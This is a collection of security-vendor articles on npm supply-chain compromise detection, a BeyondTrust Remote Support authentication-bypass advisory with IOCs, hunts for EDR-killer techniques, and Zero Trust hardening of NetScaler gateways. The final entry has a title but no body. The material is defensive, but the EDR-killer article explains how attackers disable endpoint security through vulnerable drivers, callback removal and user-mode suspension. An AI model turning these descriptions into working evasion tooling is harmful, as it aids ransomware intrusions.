articles.title: Supply Chain Zero Days: Closing the Gap Between Publication and Detection
articles.context: By analyzing new npm package versions as they are published and distributing confirmed threat intelligence across the platform, Wiz helps teams identify compromised packages...
articles.full_text:
Modern software development depends on open source packages. Developers and AI coding agents can pull new dependencies and versions into projects at speed, helping teams build and ship faster.

But that speed creates a challenge for security teams. When a trusted package is compromised, malicious code can enter development environments and build pipelines before traditional vulnerability databases flag the threat.

Organizations cannot manually review or block every update to foundational packages without slowing development. Therefore, most organizations scan newly downloaded packages against known vulnerabilities and block if needed. But, zero-day supply chain compromises won’t show up in vulnerability databases right away; and, because popular packages are already trusted, developer workflows and build pipelines are often configured to automatically pull their latest versions. If an attacker compromises one of those packages, a malicious update can spread across the environment before a CVE is even published, leaving security teams to defend from behind.

Trusted package compromises in the wild

Our own research team is seeing this technique in practice more often than ever before. In H2 2025, notable supply chain attacks made up about 10% of significant incidents. In H1 2026, that percentage increased to 25%, and now, notable supply chain attacks account for 1 in 4 significant security incidents. During the Axios compromise, for example, an unknown threat actor compromised the npm account of an axios maintainer and published two malicious versions of the npm package (v1.14.1, v0.30.4), which introduced a dependency on plain-crypto-js, a newly created malicious package.

Although the malicious versions were removed within hours, that didn't mean that the threat disappeared. According to the Wiz Research team’s own observations, at the time, Axios was present in approximately 80% of cloud and code environments, and downloaded around 100 million times per week. The package’s popularity enabled rapid exposure, with observed execution in 3% of affected environments. This reality underlines the importance of speed in defending against supply chain attacks.

Detecting malicious packages at publication

Traditionally, security teams find out a trusted package was compromised by receiving a threat advisory or vulnerability database update. In an ideal world, teams could take a proactive approach to securing the software supply chain by knowing which packages published to npm are clean, preventing installation of those that are not, and alerting on malicious versions across all tools.

That’s why we built a dedicated supply chain detection pipeline to analyze new packages and versions as soon as they are published to npm. This allows us to flag malicious packages and add detection rules in Wiz Defend, code and cloud pipelines, all before a formal CVE is published.

Here’s how it works:

When a new package version is released, the pipeline downloads and extracts the current version and previous versions for comparison.

Static analysis techniques flag suspicious files. This analysis feeds into our AI classifier engine, which returns an initial verdict.

Suspicious versions undergo dynamic analysis to validate the verdict. This dynamic analysis involves in depth work to understand the file contents, including:

Installing the package version in a sandbox environment to monitor runtime activity.

Importing the version and exposed modules .

Running the package from the CLI (where possible).

The Wiz Sensor observes runtime behavior to monitor for malicious activity. This helps the pipeline confirm the suspicious verdict, and provides our AI classifier with additional evidence.

The AI classifier returns the final verdict, generated based on all previous analyses. Once a version is confirmed as malicious, the pipeline automatically publishes IOCs to the Wiz reputation service. This ensures that Wiz customers are alerted as soon as a package enters their environment, via:

Threat intelligence center notifications, alerting on compromised packages so teams can understand if they are impacted.

Code and cloud scanning pipelines, surfacing malicious package findings wherever detected.

Wiz Defend, with auto-updated detection rules for malicious packages and configurable runtime detection and response policies.

Combining various analysis methods and live runtime execution allows us to flag zero-day compromises at speed while keeping false positives to a minimum.

Detection in the real world

A notable example of the pipeline in action is the keyv attack, where multiple npm packages in the keyv/cacheable ecosystem were compromised following the compromise of a GitHub maintainer account. In this particular case, instead of hardcoding command-and-control (C2) domains into the package source code, where static rules could easily extract and block them, the malware dynamically retrieved its C2 domains at runtime by querying an Ethereum smart contract. Because the malicious domains never appeared in the code itself, traditional static analysis alone could not identify the C2 infrastructure.

Using the supply chain pipeline, the Wiz Research Team was able to successfully see network activity to the malicious domain, automatically detecting the malicious domain connection without human intervention. Combining static and dynamic analysis, along with AI classification and live runtime monitoring, helped the pipeline flag the package with high confidence. As soon as the package was confirmed malicious, the relevant information automatically pushed to Wiz Defend and across the Wiz platform, enabling customers to detect compromised keyv versions in their environments before a formal CVE was published.

Proactive detection of compromised packages with Wiz

Open source packages are fundamental to the modern software development ecosystem. As workflows accelerate, security teams need real-time visibility and control over third-party dependencies before malicious code can land on developer workstations or build pipelines.

By analyzing new npm package versions as they are published and distributing confirmed threat intelligence across the platform, Wiz helps teams identify compromised packages before traditional vulnerability signals become available. In addition, Wiz evaluates dependencies during each install or upgrade process, to help security teams detect and manage risky or compromised package versions at the exact point of ingestion.

The goal is simple: empower security and development teams to move at machine speed, with the visibility and control over what enters the software supply chain.

articles.title: CVE-2026-102764: Critical BeyondTrust Remote Support Authentication Bypass Exploited in the Wild
articles.context: 3, the vulnerability allows unauthenticated remote attackers to perform file operations on an affected appliance without user interaction
articles.full_text:
Overview

On October 15, 2026, BeyondTrust disclosed a critical authentication bypass in Remote Support (RS), its platform for remotely troubleshooting and administering endpoints. Tracked as CVE-2026-102764 and assigned a CVSSv4 score of 9.3, the vulnerability allows unauthenticated remote attackers to perform file operations on an affected appliance without user interaction. Versions 26.2.3 and earlier are affected unless the BT26-05-RS patch has been applied.

BeyondTrust has confirmed that exploitation in the wild has already occurred prior to disclosure. Its October 16 report dates the two known Remote Support compromises to August 29, 2026: one BeyondTrust-hosted instance and one self-hosted appliance. BeyondTrust discovered and contained the hosted compromise on September 28; Mandiant shared corroborating findings from the self-hosted investigation on September 30.

On October 16, 2026, CVE-2026-102764 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation. CISA's official KEV feed lists an October 19, 2026 due date and marks forensic triage as required. Rapid7 recommends remediating affected appliances on an emergency basis and investigating RS appliances for prior compromise.

BeyondTrust's remote access products have previously been targeted earlier this year. Rapid7 covered CVE-2026-1731, which was added to KEV in February 2026.

Technical overview

According to the vendor's CVE record, internal Remote Support components inadequately validate the origin of incoming messages, permitting file operations on the appliance. The flaw is classified as authentication bypass by spoofing (CWE-290). BeyondTrust is withholding exploitation details while customers apply patches.

Mandiant's investigation describes arbitrary file uploads, deployment of the SAWFLY PHP web shell and BARECLAW tunneler, root escalation, attempted credential-vault extraction, persistence, and log deletion. Mandiant attributes the activity to ARMORY CASTLE, a suspected PRC-nexus espionage actor formerly tracked as UNC5221.

Mitigation guidance

A vendor-provided patch is available. Rapid7 strongly recommends that organizations running affected self-hosted Remote Support appliances apply it on an emergency basis, outside of normal patching cycles.

Per BeyondTrust's advisory:

Affected versions: Remote Support 26.2.3 and earlier, unless the patch has been applied.

Remediation: Apply the BT26-05-RS patch, available for versions 24.3.1 through to26.2.3.

Older deployments: Instances older than 24.3.1 require an upgrade to a patch-supported version followed by application of the patch.

Self-hosted deployments: Confirm installation through the /appliance interface. Apply the patch manually if automatic updates are not enabled.

SaaS deployments: BeyondTrust states that all Remote Support SaaS customers were patched as of October 9, 2026.

Note: BeyondTrust also recommends immediate patching of self-hosted Privileged Remote Access (PRA) because it shares the affected code. The vendor has not identified a way to exploit this vulnerability in PRA. PRA customers should confirm the appropriate patch with BeyondTrust Support.

Rapid7 strongly recommends investigating for compromise even after patching. Mandiant recommends preserving evidence before changes or reboots, isolating suspected appliances, and rebuilding from a clean, fully patched image if compromise is confirmed or cannot be ruled out. Organizations should rotate stored or brokered credentials after patching or rebuilding, and review administrative changes and downstream sessions. Credential and configuration reviews also apply to SaaS customers. Patching does not remove persistence.

For the latest mitigation guidance, please refer to the vendor's security advisory.

Artifacts, evidence sources, and IOCs

BeyondTrust recommends hunting for the following behaviors:

Unrecognized administrative sessions from residential broadband or commercial VPN addresses.

Unexpected scripts in web directories or shells spawned by web service accounts.

Unauthorized account, permission, or session-policy changes, particularly to Jump Items or Teams.

Gaps in log forwarding bounded by a single session.

The vendor cautions that infrastructure and tooling vary between victims; an absence of known indicators does not establish that an appliance is uncompromised. BeyondTrust customers can request an additional hunting package through its trust portal.

Organizations should forward appliance events to an external SIEM using BeyondTrust's syslog guidance and preserve existing external logs. Enabling forwarding now cannot recover previously deleted evidence.

Mandiant identified evidence in access, syslog, messages, thin-scc, brain, and SSL logs. Customers should coordinate host-level log and artifact inspection with BeyondTrust Support; they cannot audit the appliance host filesystem.

Mandiant's report includes the file indicators below and separate YARA rules:

Filename

Description

SHA-256

mangoapi.php

SAWFLY web shell

dc14e215269a93fdbc4c1a80b984c23faf7af0911c6dbb85309796a6f2ae95fb

ingredi_ws

BARECLAW tunneler

1f19b9a27d79c11bda00a1e8faf74a7fdd683d38ccef1b60df2fd0307e3aa462

Additional artifacts include /usr/bin/dbus-authd, /home/bomgar/sbin/post_boot.d/zz-root-persist, and an unauthorized /uidchanarge route in /ns/config/haproxy.conf.

Rapid7 customers

Exposure Command, Vulnerability Management, and Nexpose

Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-102764 with an authenticated vulnerability check expected to be available in the October 20 content release.

Updates

October 19, 2026: Initial publication.

articles.title: Bring Your Own Vulnerable Driver: What Detection Teams Should Actually Hunt
articles.context: "EDR killer," a tool built to shut down endpoint detection and response (EDR), is one phrase doing the work of four different attacks
articles.full_text:
Bring your own vulnerable driver (BYOVD) is having a moment in endpoint security. Some of the buzz is earned. Some of it is overblown. This series unpacks both and shows the evidence for each. This piece turns the noise into specific behavior a detection team can hunt.

"EDR killer," a tool built to shut down endpoint detection and response (EDR), is one phrase doing the work of four different attacks. Detection teams treat it as a single thing and write one rule that catches one technique and misses the other three. The fix is to split the category and hunt each one on its own telemetry.

The four techniques share a goal and little else. Bring-your-own-vulnerable-driver loads a signed but flawed driver and drives kernel termination through it. Bring-your-own-installer abuses a trusted installer or upgrade path to swap the agent out. Admin-to-kernel walks an already-elevated session into Ring 0 through a documented gap. Driverless suspension never touches the kernel and freezes or filters the agent from user space. One detection cannot see all four.

The cost of conflating them is a coverage gap you cannot see. A single driver-load rule looks like coverage for "EDR killers," but the bring-your-own-installer and driverless paths leave no driver-load event at all, so that rule is silent while the agent dies.

Four Techniques, Four Hunts

Each leaves a distinct footprint. Below is the taxonomy and the observable to hunt for each.

Technique

What the attacker does

Primary observable

Telemetry source

Bring-your-own-vulnerable-driver

Loads a signed, flawed driver and issues kernel termination through it

Driver load with untrusted or first-seen signature, then a service create

Sysmon Event ID 6, System Event 7045

Bring-your-own-installer

Abuses a trusted installer or upgrade path to replace the agent

Unexpected agent upgrade or reinstall outside change windows

Install or upgrade events against a change-window baseline

Admin-to-kernel

Walks an elevated session into the kernel through a known gap

Kernel-callback removal, loss of expected kernel telemetry

EDR kernel-callback integrity reporting

Driverless suspension

Freezes or filters the agent from user space, no driver

Process suspension or telemetry-egress blocking with no driver load

Process-state events, WFP filter changes, agent heartbeat

Each hunt gets the same treatment: the observable, the telemetry source and event ID, the rule logic in plain terms, and the false-positive consideration. A detection engineer can ship the first one this week, and the rest follow as the baselines clean up.

Hunt One: Bring-your-own-vulnerable-driver

Bring-your-own-vulnerable-driver is the loudest of the four and the first one to instrument. The live LOLDrivers project tracks thousands of vulnerable signed drivers, most reachable without admin rights, a deep supply of signed-but-flawed kernel access with mature, copyable detection logic already in the public domain.

The primary observable is a driver load that does not match a trusted, previously-seen signature. Sysmon Event ID 6 is the core signal, logging each driver load with ImageLoaded, Hashes, Signed, Signature, and SignatureStatus. Any SignatureStatus other than Valid warrants investigation.

Two signature-based detections are worth building directly. The first keys on the driver-load signature status itself: alert on any driver load whose signature status is not Valid, which catches the signature-enforcement bypass and the BYOVD loader chain. The second is a first-seen detection: alert on a driver whose hash, signer, or version has never been seen on the host before, so anomalous drivers surface on first load instead of after the kill.

The false-positive consideration is real. Patch cycles introduce new signers and hashes constantly, and a first-seen rule will flare on legitimate new software. Published detection content that joins Event ID 6 driver loads against a known-bad driver table ships with an explicit false-positive warning. Plan for a tuning period and an allowlist before this rule goes to a 24/7 queue.

The SentinelOne® Annual Threat Report reaches the same conclusion for hunting at scale, urging teams to chase suspicious behavior rather than specific hashes or file names. It names kernel-mode drivers derived from POORTRY used to kill EDR and delete security files, the posture every hunt below adopts.

POORTRY is the canonical signed-driver kill primitive defenders hunt. SentinelLABS traced the STONESTOP loader and the POORTRY kernel driver, which received a process-kill IOCTL to terminate security tools. The driver carried valid WHQL signatures, later revoked under advisory ADV220005. A signed kernel driver issuing process-termination IOCTLs is the behavior this hunt exists to catch.

Know your coverage baseline before you trust prevention to backstop this hunt. The attack surface reduction (ASR) rule blocks a vulnerable signed driver from being written to disk. It does not block a driver already present from loading, so a driver the blocklist policy would block keeps running until reboot and an in-progress kill chain survives policy activation. The CodeIntegrity Operational log Event ID 3099 confirms when the blocklist policy is applied on a host. It does not catch an attack. It tells you whether your driver-blocking policy is live.

Hunt Two: The Kill Chain As a Correlation Target

The strongest version of the loud hunt is the ordered sequence, because a single event tells you far less than the chain it belongs to. Public research documents the full bring-your-own-vulnerable-driver chain and its detection points. It runs as sc.exe service create (Sysmon Event ID 1) plus a service install (System Event 7045), then a driver load at Event ID 6, then a DeviceIoControl device-control call (IOCTL), then callback removal and security-process termination.

Correlating that ordered sequence is far stronger than alerting on any single step. A service create alone is common, and a driver load alone is common. The same two within seconds, followed by an IOCTL to the freshly-loaded driver, is a fingerprint ordinary administration does not produce. Build a windowed sequence rule keyed on the service name to the image path to the device handle.

This chain shows up in real intrusions. Public threat research documents the pattern across named campaigns including Kasseika, BlackByte, and RansomHub. Attackers register a vulnerable driver as a kernel service via sc.exe, name that service to mimic a Windows update, then abuse IOCTLs for kernel primitives. The service-name masquerade is itself a tell. A "KB" service name attached to an unsigned or first-seen driver image is a high-confidence pair, so watch the join between the 7045 service-install name and the Event ID 6 image it loads.

The false-positive profile for the correlation beats the single events by design, because the conjunction is rare even when each part is common. The cost moves from alert volume to engineering effort: you need reliable event ordering and a join key, which means Sysmon tuned to capture both the service and the driver-load fields. Ship this second, after the single Event ID 6 rule is stable.

Hunt Three: Kernel-callback Removal and The Kernel-Originated Kill Loop

Admin-to-kernel needs a different lens, because the kill itself can happen entirely below the EDR's user-mode vantage point. Independent security research argues that admin-to-kernel falls short of a real security boundary and that the driver blocklist is an incomplete defense against it. Once code reaches Ring 0, it can remove the hooks the EDR relies on before it issues a kill.

Callback removal is its own observable, distinct from a process kill, and it deserves its own hunt. SOC Prime documented Qilin loading rwdrv.sys for raw memory read and write alongside a malicious hlpdrv.sys for kernel-callback manipulation, removing EDR kernel callbacks across more than 300 products. The same rwdrv.sys plus hlpdrv.sys pairing appears in Akira and other crews. The observable to instrument is the silent disappearance of kernel callbacks, a loss of expected callback telemetry from the EDR's own integrity reporting.

The termination that follows can run as a kernel-mode loop. The user-mode component enumerates running processes on a repeating, fixed-interval loop and sends the target PIDs to a masquerading kernel-service driver via IOCTL. The driver then calls ZwTerminateProcess in kernel mode, bypassing protected-process light entirely.

The fixed-interval rekill cadence is itself a signature. A user-mode agent that respawns and dies again on a repeating, fixed interval is being killed from below, not crashing on its own. That behavioral fingerprint is what you hunt when the callbacks are already gone.

The false-positive consideration is that this hunt depends on telemetry the attacker is actively trying to remove. Treat callback-integrity loss and the rekill cadence as corroborating signals rather than standalone alerts, paired with the cross-domain witnesses below.

Hunt Four: Bring-your-own-installer and Driverless Suspension

Bring-your-own-installer is the quietest of the four, and it leaves no driver-load event at all. SentinelOne documented this tamper bypass, where an attacker abuses a trusted installer or upgrade path to swap the agent out. SentinelOne shipped Local Upgrade Authorization, default-on for new customers, plus a detection rule and a hunting query against the bypass.

The hunt is an unexpected agent upgrade or reinstall outside a sanctioned change window. Your driver-load rule will never fire, because no vulnerable driver was ever loaded. The rule logic compares each event against a baseline of approved change, so you need a clean inventory of sanctioned upgrade windows and the package signers you deploy. Any agent install, uninstall, or version change outside that window is the finding. This is the hardest false-positive profile of the four, because without that inventory, normal patching drowns the queue. Build the baseline first.

Driverless suspension is the fourth class, and it abuses user-mode tricks that never touch the kernel. EDR-Freeze suspends the EDR process by racing the WerFaultSecure crash handler, entirely in user mode. EDRSilencer uses Windows Filtering Platform (WFP) filters to block EDR telemetry across roughly 16 products. These two leave different observables, so hunt them separately.

For the suspend path, watch for process-suspension state changes against the agent process that no maintenance action requested. For the filter path, watch for new WFP filters that match the agent's known egress destinations and silently drop its outbound telemetry, the EDRSilencer pattern. Legitimate updates and some VPN software touch process state and WFP filters, so scope the rules to the agent's own process and endpoints.

Why These Hunts Must Keep Pace

This work is urgent because the tooling has industrialized. SentinelLABS traced AvNeutralizer, also called AuKill, to the cybercrime gang FIN7, sold on Russian-language forums for $4,000 to $15,000 and adopted by Black Basta, AvosLocker, MedusaLocker, BlackCat, Trigona, and LockBit. That commoditization is the theme of SentinelOne's latest Annual Threat Report, which describes the industrialization of the modern cyber breach with mature automation accelerating intrusions. Public reporting tracked EDRKillShifter, a driver-based killer the RansomHub crew added to its arsenal and offered through an affiliate program, turning a hard kernel technique into a checkbox. Defenders face a market, not a single actor, so the hunts have to generalize across tools.

The Kill Is a Detection Gift

Here is the reframe most teams miss. They read the kill attempt as a defense failure and stop there. Read it instead as a high-confidence signal that ransomware is about to fire.

The Cyber Security Agency of Singapore documents the EDR-killer-then-ransomware sequence across multiple gangs, with the killer firing shortly before the ransomware. The minutes between the kill and the encryption are minutes you can act in. A correlated chain alert or a fixed-interval rekill detection that fires in that window is a live intervention point, not a post-incident artifact. The same advisory frames the whole category this way. EDR-killer activity is detectable via driver-load monitoring, suspicious process-termination patterns, and attempts to disable telemetry, three observables that map cleanly to the four hunts above.

There is a rarer, cleaner signal worth a dedicated rule. Independent researcher Peter M. flagged Windows Event ID 7031, a service that terminated unexpectedly. Scoped to security services, it is an ideal detection candidate, and quiet enough to alert on directly. A forced kernel termination often leaves a crash trail the service control manager records anyway. The kill leaves a fingerprint even when it succeeds.

When the Kill Succeeds nyway

Assume the kill works. You still are not blind. A successful kill produces an absence-of-signal you can alert on directly: agent-health drop, heartbeat loss, and the absence of expected telemetry, all findings alongside your suspicious-event rules. The SentinelOne Annual Threat Report describes one SaaS compromise that ran for 71 days until an automated detection correlated activity a manual review of sign-in logs had missed. Absence-of-signal correlation is exactly the kind of work a human queue rarely sustains alone.

Cross-domain telemetry survives the kill. Once the endpoint sensor is silenced, logging that operates independently of the agent remains as a witness, including network-based detection and cloud-based security monitoring. The attacker can kill the agent on one host. They cannot kill the firewall logs, the identity provider, and the cloud control plane at the same instant, and those sensors still record the lateral movement, credential use, and command-and-control that precede ransomware. Route them into the same hunt so the endpoint blind spot does not become total.

The false-positive consideration for the absence case is the most demanding of all. Absence-of-signal detection requires a reliable baseline of expected heartbeat, or a maintenance reboot looks like an attack. Tie the heartbeat-loss rule to the change-window inventory you built for bring-your-own-installer. A silent agent on a host with no scheduled maintenance, correlated with network or identity activity, is the alert.

Honest Tuning Notes

The order you ship it in decides whether analysts trust it, so sequence the rollout by signal quality. Start with the loud bring-your-own-vulnerable-driver hunt, because Sysmon Event ID 6 is low-volume and the rules already exist. Add the chain correlation next, since correlated sequences cut the false positives single events generate. Save the absence-of-signal and unexpected-upgrade hunts for last, after the baselines clean up. Shipping them out of order floods analysts and teaches them to ignore the alerts.

Retire the Wrong Scoreboard

Stop scoring on "did the kill succeed." Score on "did we catch the kill." Catching it early gives the response team the minutes that decide whether files get encrypted.

Deploy this on Monday. Turn on Sysmon Event ID 6 logging and the untrusted-driver and first-seen rules for the loud class. Build the service-create-to-driver-load-to-termination correlation for the chain. Add a dedicated Event ID 7031 rule and an agent-health heartbeat monitor for the absence case. Wire network, identity, and cloud telemetry into the same view so a silenced sensor is not a silenced investigation.

The shift is from waiting for a verdict to running a hunt. That posture depends on an agent that keeps running and keeps telemetry flowing under attack, so demand the survivability test data before trusting any vendor's claim, ours included.

Why This Is the Work SentinelOne Exists to Do

Running these hunts in the minutes before encryption is where the contest is won, and that window is exactly what SentinelOne built Purple AI® to operate inside. Its Agentic Investigation capability runs the kind of zero-click investigation these hunts describe. It correlates the driver load, the service install, the callback removal, and the silence that follows, then renders a verdict and a response at machine speed. The kill attempt becomes the trigger, and the investigation is already running while the attacker still believes the sensor is blind.

Most security teams cannot run four hunts around the clock, and the attacker knows which hours are thin. Wayfinder, SentinelOne's managed detection and response practice, runs them for you, putting human hunters and autonomous investigation on the same telemetry every hour of every day. The kill is the middle of the story, and the platform is built to catch it there.

Step back across the whole series. It traced the EDR killer through four moves. A market with a price list. An industry with suppliers and resale. The trust gap it operates inside. And the hunts that catch it. One idea held the whole way through. A defender who watches behavior beats one who chases the binary of the week. Attackers turned the kill into a product. The answer is the one move a supplier cannot re-skin. It is the reach into the kernel to terminate what defends the host. Defenders are the protagonists of that story, and the platform exists to keep them there. A safer future for humanity is built by the people who refuse to look away when the kernel turns hostile.

External References

"Sysmon Community Guide: Driver Loading." TrustedSec, n.d.

"Qilin EDR Killer: Driver Abuse to Terminate 300+ Tools." SOC Prime, 2026-04-07.

"GRITREP: Observed Malicious Driver Use Associated with Akira SonicWall Campaign." GuidePoint Security (GRIT), 2025-08-05.

"EDR-killer driven by a decade-old vulnerable forensic driver." Help Net Security, 2026-02-05.

"New EDR-Freeze tool uses Windows WER to suspend security software." BleepingComputer, 2025-09-22.

"EDRSilencer." netero1010, GitHub repository, retrieved 2026-06-26.

"EDRSilencer red team tool used in attacks to bypass security." BleepingComputer, 2024-10-15.

"EDR-killing malware is the latest trend in ransomware." The Register, 2025-08-14.

articles.title: Beyond the patch: Protecting your NetScaler gateway against future vulnerabilities
articles.context: The recent disclosure of a major vulnerability in Citrix NetScaler pointed to a widespread weak point: a login page is an attack surface that can be used to compromise and...
articles.full_text:
The recent disclosure of a major vulnerability in Citrix NetScaler pointed to a widespread weak point: a login page is an attack surface that can be used to compromise and access an application server. Indeed, the disclosures included an actively exploited flaw that allowed attackers to execute commands on affected gateways without signing in. As with any emergency patch, admins had to weigh cutting off or disrupting their users’ access with the risk of delaying a critical security update.

If you’re a NetScaler customer and you haven’t patched your instance, stop reading and go do that. This was a bad one. Once you’ve finished the patch, we’ll explore how to avoid a future fire drill by laying additional security controls.

This issue extends beyond NetScaler and can be applied to any internal application available on the Internet. Remote desktop portals, administrative consoles, and other publicly accessible authentication pages all deserve the same scrutiny: Does the intended audience require unrestricted Internet reachability? And can an attacker bypass this authentication check to reach the application's server?

Citrix released software updates to address the flaw, and Cloudflare followed with an emergency web application firewall (WAF) rule on October 1. But having a patch available does not guarantee safety: every instance has to be identified, updated, and tested. Applying updates across a production deployment is painful — it can result in downtime or cause disruptions to employees who still need their desktops throughout that process. Customers, patients, and others dependent on users of a remote desktop definitely don’t care about your security patch.

Using a web application firewall (WAF) can buy some additional time before a patch can be fully rolled out, but it’s reactive and does not account for the next exploit that’s discovered. Cloudflare and other security vendors do their best to cover variations and similar attacks. But AI is hastening how rapidly attackers can discover new and novel variants. That’s why it is crucial to build defense in depth, to ensure that no specific software failure or exploit will lead to a critical security issue.

Cloudflare combines access policies, web application security, and restricted origin connections to protect the authentication service before a new vulnerability is disclosed. Access controls limit who can reach the application server; WAF inspection evaluates web requests for attacks; origin restrictions prevent direct connections from bypassing those defenses. These reduce exposure without waiting for a new exploit signature or replacing the existing desktop platform.

The NetScaler exploit

Citrix's September 27, 2026 bulletin reported observed exploitation of CVE-2026-88771 and CVE-2026-88772. The first allows unauthenticated command execution on affected appliances, including in their default configuration. The second affects configurations using Datagram Transport Layer Security, or DTLS. Further advisories on October 3 and October 8 addressed additional vulnerabilities in SAML configurations. These exploits allowed attackers to execute arbitrary scripts on target machines and also execute denial of service attacks.

CISA's alert and Mandiant's technical investigation cover the vulnerabilities, observed exploitation, and response guidance in more detail. For details of the available web application protection, see Cloudflare's emergency WAF release for CVE-2026-88771.

In a typical Citrix deployment, the user authenticates through NetScaler Gateway, which then uses a secure ticket authority to pass through to the StoreFront, which presents the applications and desktops available to that user. The native-installed Citrix app then uses that information to establish a separate connection using Citrix's Independent Computing Architecture (ICA) protocol. The gateway validates the ticket before proxying the desktop connection. Citrix documents these as distinct stages of the connection workflow. The entire exploit stems from the fact that the Gateway has to be publicly accessible on the Internet, otherwise users would not be able to initiate their desktop connection.

Put the access decision in front of the authentication server

The best thing that you can do, after patching all your instances, is move any publicly accessible login pages or applications behind single sign-on before the request ever hits the target server. Cloudflare Access can enforce an independent access policy before the request reaches the existing gateway server. The Citrix environment continues to determine which desktop the user may launch and to validate the resulting session ticket. The additional boundary ensures that an attacker could never get to the Gateway server to try running specific exploits. They would only see the Cloudflare Access login page.

That decision no longer depends on recognizing an exploit signature and blocking that way, but rather on a set of Zero Trust policies that determine if someone should even be there to begin with. More attacks like this are coming, and adopting Zero Trust controls throughout your network is the single most important thing you should do next.

This follows the principle described in Cloudflare's own architecture as customer zero: reduce exposure and use independent defenses so that one flaw does not become a compromise. Here, the practical starting point is the service that users reach before they enter their applications.

Protecting the web authentication path adds a boundary in front of the existing Citrix controls. It does not automatically extend that boundary to other gateway services, including DTLS-enabled listeners. Those interfaces still need their own exposure review and applicable security updates, even when the desktop sessions they support already require authentication.

The origin connection must enforce the same boundary

Changing a DNS record and enforcing Access policies are not enough. If an attacker can connect to the original address or an alternate hostname, they can avoid the controls placed in front of it. Access enforces a specific hostname: if the authentication server can be reached via an IP address or alternative hostname, then the Access policy enforcement is worthless. It’s important to take steps to ensure that all traffic comes from a request that was validated by Access. There are a few different approaches to accomplish this, based on your internal architecture.

Cloudflare Tunnel is the most commonly used approach. It establishes an outbound only tunnel from your application server and allows you to close all inbound IP traffic. This means that you won’t have a public IP for the server that can be reached by anyone.

When a public origin IP Address must remain or connector software cannot be run, network restrictions and origin authentication need to constrain the connections it accepts. For example, Dedicated CDN Egress IPs give an account dedicated source addresses for traffic from Cloudflare to its origins. The application server’s firewall can allow those addresses and reject other sources. This makes the network restriction specific to the account's traffic, rather than broadly allowing traffic from Cloudflare's shared address ranges.

Authenticated Origin Pulls can add further depth with mutual TLS to verify the Cloudflare-to-origin connection.

An origin that supports it can also validate the Access JSON Web Token, including its signature, issuer, expiry, and intended application audience. This is the best way to guarantee that a request was authenticated by Access.

If you're unsure where to start, speak with a Cloudflare expert to review your architecture and identify which controls fit your environment.

Protect the web-facing authentication service

Cloudflare Access determines who may reach the web application; Cloudflare's web application firewall (WAF) inspects HTTP requests to that same protected service. The WAF runs before any Access authentication checks, which gives you the ability to completely block known malicious IPs, specific countries, ASNs, or other attributes you know definitely shouldn’t be accessing your applications. The firewall runs continuously on all requests and will also identify users who managed to authenticate attempting to run exploits with known CVE signatures.

Alongside managed CVE signatures, WAF Attack Score uses machine learning to identify potentially malicious requests that do not exactly match a known rule. Administrators can use the score in rules that block or challenge requests. The WAF attack score is powered by network observations from Cloudflare's global network traffic and Cloudforce One investigations feed Cloudflare's shared threat-intelligence platform.

Customers with a Cloudforce One threat intelligence subscription can also use live threat indicators in WAF policies. That adds context about known malicious sources alongside inspection of the request itself.

Reducing exposure does not remove an attacker who already has a foothold. Seriously: go patch your system if you haven’t, and follow Citrix's suspected-compromise guidance. They lay out how to preserve evidence, revoke credentials and certificates, investigate connected systems, and rebuild or restore from a known-good state.

Extend Zero Trust to desktop access, or remove the desktop dependency

Protecting web authentication can be an initial step without making it the final architecture. Cloudflare's Zero Trust architecture for virtual desktops also supports controlling access to the desktop infrastructure itself. With the Cloudflare One Client and private-network connectivity, teams can restrict who and which devices may reach the endpoints carrying desktop traffic, including an existing Independent Computing Architecture (ICA) path. This requires its own routing and policy design; it is not a capability supplied by the browser authentication proxy alone.

Some workflows can remove the ICA dependency instead. For supported Windows workloads, Cloudflare's browser-based remote desktop access connects users to a Windows host through Cloudflare Tunnel, without a local remote desktop client. If users only need a desktop to open web applications, Access and Browser Isolation can replace that web-access use case without a full virtual desktop.

Start by protecting the authentication service and existing desktop connections. Then replace virtual desktops used only for web access, and move supported Windows workflows to browser-based remote desktops. Reducing exposure does not have to wait for a full desktop migration.

Decide which authentication services need to be public

The same assessment applies beyond virtual desktops. An employee portal or management console may need to be reachable by approved users from anywhere, without needing to accept application requests from everyone.

Not every authentication page can require a prior employee identity. Consumer login pages and the identity-provider endpoints required to establish an initial session may need to remain publicly reachable. Protect those intentionally, and avoid introducing circular authentication dependencies. The point is to make reachability a design decision rather than an inherited default.

Start with one restricted service. Map the web and non-web paths into it, then put the access decision ahead of its authentication surface. Before expanding the rollout, validate the boundary in your own environment:

Request the protected hostname without signing in. Confirm the request stops at Cloudflare rather than reaching the origin.

Sign in with a test account outside the permitted group. Confirm it still cannot reach the protected application.

Test direct-origin addresses and alternate hostnames. Confirm none bypasses the access policy.

Sign in as an approved user. Confirm authentication, desktop launch, and session reconnection still work.

Check the relevant policy, firewall, and origin logs rather than relying only on what the browser displays. Repeat these checks when routing, identity, or failover settings change, so the next configuration update does not quietly reopen the path you closed.

Bring the controls together

The full architecture brings the access decision, web inspection, and availability controls in front of NetScaler, with restrictions on the connection to the origin. The public origin and Tunnel paths are alternatives. The native desktop connection remains separate, with an optional Zero Trust network access layer around that traffic.

Get started

Speak with a Cloudflare expert to plan the right controls for your environment. Download the solution brief and sign up for the upcoming webinar.

Andrei Migia, Nathan Sackett, and Doug Shepherd contributed to this post.

articles.title: CVE-2026-88771: Inside the Exploitation of a Critical NetScaler RCE Vulnerability
articles.context: ThreatLabz also observed delivery of a FreeBSD x64 implant from infrastructure that overlapped with activity we previously associated with exploitation of StyleSmuggler...
articles.full_text:
